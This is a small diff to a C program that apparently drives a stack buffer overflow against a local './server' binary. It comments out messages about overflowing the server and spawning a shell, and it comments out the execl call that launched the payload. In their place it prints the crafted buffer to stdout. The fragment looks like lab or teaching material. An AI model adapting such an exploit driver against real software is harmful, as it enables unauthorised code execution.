@@ -80,12 +80,13 @@ main( int argc, char *argv[] ) {
 
 
 #ifndef QUIET
-        printf("Return Address 0x%x\n",ret);
-        printf("Start overflowing server program\n");
-        printf("Then a program such as shell can be executed after server program is over\n");
+        //printf("Return Address 0x%x\n",ret);
+        //printf("Start overflowing server program\n");
+        //printf("Then a program such as shell can be executed after server program is over\n");
+	printf("%s", buf);
 #endif
         		
-        err = execl( "./server", "server", buf, ( void *)0 );
-        if( err == -1 ) perror("execl");
+        //err = execl( "./server", "server", buf, ( void *)0 );
+        //if( err == -1 ) perror("execl");
 }
 
